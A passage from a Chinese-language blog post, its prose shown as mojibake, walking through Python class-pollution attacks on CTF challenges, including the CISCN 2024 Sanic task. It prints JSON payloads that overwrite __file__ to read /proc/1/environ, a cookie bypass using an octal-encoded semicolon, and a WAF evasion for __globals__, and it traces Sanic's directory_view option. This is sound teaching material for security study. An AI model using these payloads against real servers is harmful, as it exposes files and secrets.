</div><p>æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•è¯»ç¯å¢ƒå˜é‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;username&#34;:&#34;a&#34;,
</span></span><span class="line"><span class="cl">    &#34;password&#34;:&#34;b&#34;,
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;:{
</span></span><span class="line"><span class="cl">        &#34;check&#34;:{
</span></span><span class="line"><span class="cl">            &#34;__globals__&#34;:{
</span></span><span class="line"><span class="cl">                &#34;__file__&#34; : &#34;/proc/self/environ&#34;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>flagä¸ºno</p>
<p>æˆ‘ä»¬æ¢ä¸€ç§ï¼Œç¯å¢ƒå˜é‡å¯ä»¥é€šè¿‡ <code>/proc/$PID/environ</code> æ¥è¯»å–</p>
<p>æ±¡æŸ“æˆ<code>/proc/1/environ</code>å°±å‡ºæ¥äº†</p>
<h3 id="ciscn2024-åˆèµ›-sanic">[Ciscn2024 åˆèµ›] sanic
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">text</span><span class="p">,</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic_session</span> <span class="kn">import</span> <span class="n">Session</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pydash==5.1.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollute</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Session</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;static/index.html&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;adm;n&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;login success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;login fail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/src&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">src</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">admin</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="s1">&#39;_.&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pollute</span> <span class="o">=</span> <span class="n">Pollute</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">pollute</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;forbidden&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;forbidden&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨adminè·¯ç”±çœ‹åˆ°<code>pydash.set_</code>å¯ä»¥æƒ³åˆ°æ±¡æŸ“srcè·¯ç”±æ¥ç”¨<code>__file</code>æ¥è¯»æ–‡ä»¶</p>
<p>ä½†æ˜¯åœ¨loginè·¯ç”±é¦–å…ˆæœ‰ä¸ªcookieçš„userå¿…é¡»æ˜¯adm;nï¼Œç”±äºè¿™é‡Œæ˜¯ä»sessionä¸­è¯»å–ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¼šåœ¨åˆ†å·å¤„æˆªæ–­ï¼Œç›´æ¥ä¼ è‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚æ€ä¹ˆç»•è¿‡å‘¢ï¼Œå¾ˆç®€å•ï¼Œåˆ©ç”¨å…«è¿›åˆ¶ç¼–ç ä¸€ä¸‹å°±è¡Œäº†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user=&#34;adm\073n&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223306655.png"
	width="1865"
	height="804"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223306655_hu8043562558477733309.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223306655_hu12973804378228346261.png 1024w"
	loading="lazy"
	
		alt="image-20250328223306655"
	
	
		class="gallery-image" 
		data-flex-grow="231"
		data-flex-basis="556px"
	
></p>
<p>ç„¶åæ‹¿sessionå»adminè·¯ç”±</p>
<p>é‚£ä¹ˆæ€è·¯åˆ°è¿™é‡Œå°±å¾ˆæ˜ç¡®äº†ï¼Œä¸»è¦å°±æ˜¯è€ƒå¯Ÿä¸€ä¸ªRFC2068 çš„ç¼–ç è§„åˆ™ç»•è¿‡å’Œä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ã€‚</p>
<p>åŒæ—¶è¿™é‡Œwafäº†**_.**çš„ç»„åˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__init__\\\\.__globals__
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223739300.png"
	width="1836"
	height="649"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223739300_hu11923213358021302680.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223739300_hu11427837439384655088.png 1024w"
	loading="lazy"
	
		alt="image-20250328223739300"
	
	
		class="gallery-image" 
		data-flex-grow="282"
		data-flex-basis="678px"
	
></p>
<p>å›åˆ°srcè·¯ç”±å°±å¯ä»¥çœ‹åˆ°ï¼Œä½†æ˜¯ç›´æ¥è¯»flagæ˜¯æ²¡æœ‰çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯è¿™é¢˜çš„è€ƒç‚¹æ‰€åœ¨äº†ï¼Œ<strong>éœ€è¦æˆ‘ä»¬åˆ©ç”¨æ±¡æŸ“çš„æ–¹å¼å¼€å¯åˆ—ç›®å½•åŠŸèƒ½ï¼ŒæŸ¥çœ‹æ ¹ç›®å½•ä¸‹flagçš„åç§°ï¼Œå†è¿›è¡Œè¯»å–</strong></p>
<p>æœ‰ä¸ªéé¢„æœŸå°±æ˜¯è·Ÿä¸Šé¢ä¸€æ ·è¯»ç¯å¢ƒå˜é‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Session</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›staticå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">static</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">uri</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">file_or_directory</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="n">PathLike</span><span class="p">,</span> <span class="nb">str</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="n">pattern</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;/?.+&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">use_modified_since</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">use_content_range</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">stream_large_files</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">int</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;static&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">strict_slashes</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">bool</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">content_type</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">apply</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">resource_type</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">index</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Sequence</span><span class="p">[</span><span class="nb">str</span><span class="p">]]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory_view</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory_handler</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">DirectoryHandler</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Register a root to serve files from. The input can either be a file or a directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        This method provides an easy and simple way to set up the route necessary to serve static files.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        Args:
</span></span></span><span class="line"><span class="cl"><span class="s2">            uri (str): URL path to be used for serving static content.
</span></span></span><span class="line"><span class="cl"><span class="s2">            file_or_directory (Union[PathLike, str]): Path to the static file
</span></span></span><span class="line"><span class="cl"><span class="s2">                or directory with static files.
</span></span></span><span class="line"><span class="cl"><span class="s2">            pattern (str, optional): Regex pattern identifying the valid
</span></span></span><span class="line"><span class="cl"><span class="s2">                static files. Defaults to `r&#34;/?.+&#34;`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            use_modified_since (bool, optional): If true, send file modified
</span></span></span><span class="line"><span class="cl"><span class="s2">                time, and return not modified if the browser&#39;s matches the
</span></span></span><span class="line"><span class="cl"><span class="s2">                server&#39;s. Defaults to `True`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            use_content_range (bool, optional): If true, process header for
</span></span></span><span class="line"><span class="cl"><span class="s2">                range requests and sends  the file part that is requested.
</span></span></span><span class="line"><span class="cl"><span class="s2">                Defaults to `False`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            stream_large_files (Union[bool, int], optional): If `True`, use
</span></span></span><span class="line"><span class="cl"><span class="s2">                the `StreamingHTTPResponse.file_stream` handler rather than
</span></span></span><span class="line"><span class="cl"><span class="s2">                the `HTTPResponse.file handler` to send the file. If this
</span></span></span><span class="line"><span class="cl"><span class="s2">                is an integer, it represents the threshold size to switch
</span></span></span><span class="line"><span class="cl"><span class="s2">                to `StreamingHTTPResponse.file_stream`. Defaults to `False`,
</span></span></span><span class="line"><span class="cl"><span class="s2">                which means that the response will not be streamed.
</span></span></span><span class="line"><span class="cl"><span class="s2">            name (str, optional): User-defined name used for url_for.
</span></span></span><span class="line"><span class="cl"><span class="s2">                Defaults to `&#34;static&#34;`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            host (Optional[str], optional): Host IP or FQDN for the
</span></span></span><span class="line"><span class="cl"><span class="s2">                service to use.
</span></span></span><span class="line"><span class="cl"><span class="s2">            strict_slashes (Optional[bool], optional): Instruct Sanic to
</span></span></span><span class="line"><span class="cl"><span class="s2">                check if the request URLs need to terminate with a slash.
</span></span></span><span class="line"><span class="cl"><span class="s2">            content_type (Optional[str], optional): User-defined content type
</span></span></span><span class="line"><span class="cl"><span class="s2">                for header.
</span></span></span><span class="line"><span class="cl"><span class="s2">            apply (bool, optional): If true, will register the route
</span></span></span><span class="line"><span class="cl"><span class="s2">                immediately. Defaults to `True`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            resource_type (Optional[str], optional): Explicitly declare a
</span></span></span><span class="line"><span class="cl"><span class="s2">                resource to be a `&#34;file&#34;` or a `&#34;dir&#34;`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            index (Optional[Union[str, Sequence[str]]], optional): When
</span></span></span><span class="line"><span class="cl"><span class="s2">                exposing against a directory, index is  the name that will
</span></span></span><span class="line"><span class="cl"><span class="s2">                be served as the default file. When multiple file names are
</span></span></span><span class="line"><span class="cl"><span class="s2">                passed, then they will be tried in order.
</span></span></span><span class="line"><span class="cl"><span class="s2">            directory_view (bool, optional): Whether to fallback to showing
</span></span></span><span class="line"><span class="cl"><span class="s2">                the directory viewer when exposing a directory. Defaults
</span></span></span><span class="line"><span class="cl"><span class="s2">                to `False`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            directory_handler (Optional[DirectoryHandler], optional): An
</span></span></span><span class="line"><span class="cl"><span class="s2">                instance of DirectoryHandler that can be used for explicitly
</span></span></span><span class="line"><span class="cl"><span class="s2">                controlling and subclassing the behavior of the default
</span></span></span><span class="line"><span class="cl"><span class="s2">                directory handler.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        Returns:
</span></span></span><span class="line"><span class="cl"><span class="s2">            List[sanic.router.Route]: Routes registered on the router.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        Examples:
</span></span></span><span class="line"><span class="cl"><span class="s2">            Serving a single file:
</span></span></span><span class="line"><span class="cl"><span class="s2">            ```python
</span></span></span><span class="line"><span class="cl"><span class="s2">            app.static(&#39;/foo&#39;, &#39;path/to/static/file.txt&#39;)
</span></span></span></code></pre></td></tr></table>
</div>
</div><pre><code>        Serving all files from a directory:
        ```python
        app.static('/static', 'path/to/static/directory')
        ```

        Serving large files with a specific threshold:
        ```python
        app.static('/static', 'path/to/large/files', stream_large_files=1000000)
        ```
    &quot;&quot;&quot;  # noqa: E501
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">ä¸»è¦æ˜¯è¿™ä¸ªæ³¨é‡Š</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">â€‹</span><span class="o">```</span><span class="n">python</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">directory_view</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">):</span><span class="w"> </span><span class="n">Whether</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">fallback</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">showing</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">the</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">viewer</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">exposing</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">directory</span><span class="p">.</span><span class="w"> </span><span class="n">Defaults</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">to</span><span class="w"> </span><span class="o">`</span><span class="no">False</span><span class="o">`</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">directory_handler</span><span class="w"> </span><span class="p">(</span><span class="n">Optional</span><span class="p">[</span><span class="n">DirectoryHandler</span><span class="p">],</span><span class="w"> </span><span class="n">optional</span><span class="p">):</span><span class="w"> </span><span class="n">An</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">instance</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">DirectoryHandler</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">explicitly</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">controlling</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">subclassing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">behavior</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">default</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">directory</span><span class="w"> </span><span class="n">handler</span><span class="p">.</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¤§è‡´æ„æ€å°±æ˜¯directory_viewä¸ºTrueæ—¶ï¼Œä¼šå¼€å¯åˆ—ç›®å½•åŠŸèƒ½ï¼Œdirectory_handlerä¸­å¯ä»¥è·å–æŒ‡å®šçš„ç›®å½•</p>
<p>è·Ÿè¿›directory_handler</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">directory_handler</span><span class="p">:</span>
